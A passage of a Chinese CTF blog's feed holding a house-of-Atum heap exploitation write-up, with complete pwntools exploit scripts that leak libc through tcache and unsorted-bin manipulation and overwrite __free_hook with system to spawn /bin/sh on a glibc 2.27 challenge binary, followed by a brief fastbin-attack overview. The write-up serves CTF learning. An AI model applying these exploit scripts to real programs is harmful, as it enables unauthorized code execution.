class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./houseofAtum&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/myheart/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Input the content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Input the content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx,choose</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Clear?(y/n):&#x27;</span>,choose)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x11</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content:&#x27;</span>)</span><br><span class="line">chunk_addr = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">chunk_addr = <span class="built_in">int</span>.from_bytes(chunk_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;chunk_addr--&gt;&#x27;</span>,<span class="built_in">hex</span>(chunk_addr))</span><br><span class="line">chunk_addr = chunk_addr -<span class="number">0x10</span> - <span class="number">0x20</span> </span><br><span class="line">delete(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">payload = p64(chunk_addr)</span><br><span class="line">add(payload)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">payload =  p64(<span class="number">0</span>)*<span class="number">0x3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">add(payload)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">edit(<span class="number">1</span>,payload1)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content:&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">leak = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">leak = <span class="built_in">int</span>.from_bytes(leak,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak---&gt;&#x27;</span>,<span class="built_in">hex</span>(leak))</span><br><span class="line">libc_addr = leak - <span class="number">96</span> -<span class="number">0x10</span> -libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_addr----&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">sys_addr = libc_addr+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_addr + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br></pre></td></tr></table></figure><ul><li>但是在进行<code>show(1)</code>操作时，我们还要对<code>idx=1</code>处的堆块进行编辑。因为<code>0x*****240</code>这边都是空字节，在使用<code>puts</code>函数输出时，并不会将<code>main_arena+96</code>这个地址给泄露出来。所以我们要先填充<code>b&#39;a&#39;*0x20</code>，再调用<code>show(1)</code>进行地址的泄露。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326202137118.png" alt="image-20250326202137118"></p><ul><li>并且泄露之后我们还需要将对应地址<code>0x****260</code>的<code>prev_size</code>、<code>size</code>复原，要不然在下次申请的时候会程序就会报错。</li><li>泄露的结果如下：</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326202717422.png" alt="image-20250326202717422"></p><ul><li>接下来我们就要对<code>unsortedbin</code>这个运行进制进行利用了，我们先来看看目前<code>bins</code>的布局</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326202809125.png" alt="image-20250326202809125"></p><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326204013421.png" alt="image-20250326204013421"></p><ul><li>此时利用的是<code>tcachebin_UAF然后申请到任意地址</code>，我们已经泄露了<code>libc</code>的地址，这时我们就可以劫持<code>hook</code>从而<code>getshell</code>，这里我们选择劫持<code>__free_hook</code>这个函数指针为<code>system(&#39;/bin/sh&#39;)</code>。所以我们先要将堆块申请到<code>__free_hook</code>这个位置。</li><li>并且由于<code>tcachebins</code>在取出堆块的时候并没有对<code>chunk</code>的<code>size</code>位做检测，所以并不要寻找合适的<code>size</code>对应的内存进行申请，直接申请<code>__free_hook-0x20</code>这个位置即可。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326204959390.png" alt="image-20250326204959390"></p><ul><li>这时我们还需要修改已经被放入<code>tcachbin</code>中的<code>size</code>位为<code>0x51</code>，这样我们申请的时候就可以申请到处于<code>0x*****260</code>处的堆块。</li><li>并且我们还要修改<code>fd</code>的值为<code>free_hook-0x20</code>，这样在申请完<code>0x*******260</code>这个堆块的时候<code>free_hook-0x20</code>这个地址就会被链到<code>tcachebin</code>上,具体效果如下：</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326205742872.png" alt="image-20250326205742872"></p><ul><li>但是此时<code>idx=0</code>和<code>idx=1</code>都已经有堆块了，所以我们申请到<code>0x******260</code>这个堆块后，又要将其释放。但是该堆块会被放入<code>fasbin</code>中，所以我们下次申请时就会申请到<code>__free_hook-0x20</code>这个位置，接下来将<code>/bin/sh</code>先写入到<code>free_hook-0x10</code>的位置，然后将<code>system_addr</code>填入<code>__free_hook</code>中。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">0x3</span> + p64(<span class="number">0x51</span>) + p64(free_hook-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"><span class="comment">#payload = p64(free_hook-0x10)</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(sys_addr)</span><br><span class="line">add(payload)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326210646490.png" alt="image-20250326210646490"></p><ul><li>填入之后再使用<code>free</code>调用释放这个堆块，这时<code>free(0x7fcd558de8d8)</code>，就相当于执行<code>system(&quot;/bin/sh&quot;)</code>，<code>0x7fcd558de8d8</code>这个内存地址中存储的就是<code>/bin/sh\x00</code>这个字符串。这样就能取得<code>shell</code>了</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326211104707.png" alt="image-20250326211104707"></p><h2 id="level_1_exp"><a href="#level-1-exp" class="headerlink" title="level_1_exp"></a>level_1_exp</h2><ul><li>具体的<code>exp</code>如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./houseofAtum&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/myheart/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Input the content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Input the content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx,choose</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Clear?(y/n):&#x27;</span>,choose)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x11</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content:&#x27;</span>)</span><br><span class="line">chunk_addr = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">chunk_addr = <span class="built_in">int</span>.from_bytes(chunk_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;chunk_addr--&gt;&#x27;</span>,<span class="built_in">hex</span>(chunk_addr))</span><br><span class="line">chunk_addr = chunk_addr -<span class="number">0x10</span> - <span class="number">0x20</span> </span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">payload = p64(chunk_addr)</span><br><span class="line">add(payload)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">payload =  p64(<span class="number">0</span>)*<span class="number">0x3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">add(payload)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">edit(<span class="number">1</span>,payload1)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content:&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">leak = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">leak = <span class="built_in">int</span>.from_bytes(leak,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak---&gt;&#x27;</span>,<span class="built_in">hex</span>(leak))</span><br><span class="line">libc_addr = leak - <span class="number">96</span> -<span class="number">0x10</span> -libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_addr----&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">sys_addr = libc_addr+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_addr + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">0x3</span> + p64(<span class="number">0x51</span>) + p64(free_hook-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">payload = p64(free_hook-<span class="number">0x10</span>)</span><br><span class="line">add(payload)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(sys_addr)</span><br><span class="line">add(payload)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="利用失效"><a href="#利用失效" class="headerlink" title="利用失效"></a>利用失效</h1><ul><li><code>glibc2.31</code>后利用基本失效了</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// glibc ≥ 2.30</span></span><br><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//......</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// glibc &lt; 2.30</span></span><br><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//......</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">前言：调整一下继续学习堆。</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>fastbin_attack总结</title>
    <link href="http://iyheart.github.io/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/fastbin-attack/"/>
    <id>http://iyheart.github.io/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/fastbin-attack/</id>
    <published>2025-03-25T00:49:30.000Z</published>
    <updated>2025-03-26T14:32:29.753Z</updated>
    
    <content type="html"><![CDATA[<ul><li>参考博客：<a href="https://www.yuque.com/cyberangel/rg9gdm/og73qz">PWN入门（3-7-1）-fastbin_attack综述</a></li><li>学了几个<code>house of</code>系列，发现<code>house of</code>系列像是堆利用的进阶。正常流程应该是如下：<ul><li>了解完<code>堆管理机制</code>，开始做几道简单的<code>fastbin_UAF</code>漏洞</li><li>接下去<code>fastbin_dubole_free</code>漏洞</li><li>了解<code>堆溢出</code>漏洞，做几道简单堆溢出漏洞</li><li>了解<code>off-by-one</code>和<code>off-by-null</code>漏洞，学习堆分水，再没有<code>UAF</code>漏洞下，利用堆分水构造出<code>UAF</code>漏洞，从而进行利用，同时还可以学习<code>unlink</code>利用。</li><li>学完以上利用，就可以整体归纳<code>fastbin_attack</code>利用，这样就对堆的<code>fastbin</code>运行机制印象比较深刻，同时在<code>unlink</code>利用中还可以了解<code>unsortedbin</code>的运行机制。并且在学习<code>bins_attack</code>的同时也可以或多或少的接触到<code>house-of</code>系列。(总之先别把house-of系列当主线，好像又走弯路了QAQ。)</li><li>之后就是<code>tcachebin_attach</code>、<code>unsortedbin_attack</code>、<code>smallbin_attack</code>、<code>largebin_attack</code>，在学习这些利用的时候就可以顺便了解这些堆块的运行机制。</li><li>这样就会为之后<code>house-of</code>系列的利用做准备。</li></ul></li></ul><h1 id="fastbin_attack总结"><a href="#fastbin-attack总结" class="headerlink" title="fastbin_attack总结"></a>fastbin_attack总结</h1><ul><li>接下来我们就来归纳一下<code>fastbin_attack</code>的几种利用方式：<ul><li><code>fastbin_UAF_easy</code>：相当于对<code>UAF</code>的简单利用（后面加了个<code>ease</code>）</li><li><code>fastbin_double_free</code>：这个手法虽然是<code>UAF</code>的一种，需要独自展开来说明。</li><li><code>fastbin_UAF_plus</code>：这个指的就是一般难度的<code>UAF</code>漏洞了。通常指的是利用<code>off-by</code>漏洞实现<code>UAF</code>的这种难度。</li><li><code>House-of-spirit</code>：这个手法需要通过<code>free一个伪造的堆块</code>来实现利用，而不是使用<code>释放后的堆块</code>，所以这个并不是</li></ul></li></ul><h1 id="fastbin_uaf_easy"><a href="#fastbin-UAF-easy" class="headerlink" title="fastbin_UAF_easy"></a>fastbin_UAF_easy</h1><ul><li>关于<code>fastbin_UAF</code>的利用，我写在了这篇博客中：<a href="https://iyheart.github.io/2024/09/04/CTFblog/PWN系列blog/Linux_pwn/2.堆系列/PWN堆UAF/">PWN堆UAF | iyheart的博客</a></li></ul><h1 id="fastbin_double_free"><a href="#fastbin-double-free" class="headerlink" title="fastbin_double_free"></a>fastbin_double_free</h1><ul><li>关于<code>fastbin_double</code>的利用，我写在了这篇文章中：<a href="https://iyheart.github.io/2024/09/11/CTFblog/PWN系列blog/Linux_pwn/2.堆系列/PWN堆double-free/">PWN堆double_free | iyheart的博客</a></li></ul><h1 id="fastbin_uaf_plus"><a href="#fastbin-UAF-plus" class="headerlink" title="fastbin_UAF_plus"></a>fastbin_UAF_plus</h1><ul><li><h1 id="house_of_spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h1></li><li><p>关于<code>house_of_spirit</code>的利用，我写在了这篇文章中：<a href="https://iyheart.github.io/2025/01/13/CTFblog/PWN系列blog/Linux_pwn/2.堆系列/PWN堆house-of-sprirt/?highlight=house+of+sp">PWN堆house of spirit-1 | iyheart的博客</a></p></li></ul>]]></content>
    
    
    <summary type="html">前言：先学一下各种bin_attack再接下去打house</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN系列文章索引</title>
    <link href="http://iyheart.github.io/2025/03/25/PWN%E7%B3%BB%E5%88%97%E6%96%87%E7%AB%A0%E7%B4%A2%E5%BC%95/"/>
    <id>http://iyheart.github.io/2025/03/25/PWN%E7%B3%BB%E5%88%97%E6%96%87%E7%AB%A0%E7%B4%A2%E5%BC%95/</id>
    <published>2025-03-25T00:45:16.000Z</published>
    <updated>2025-03-26T14:33:17.985Z</updated>
    
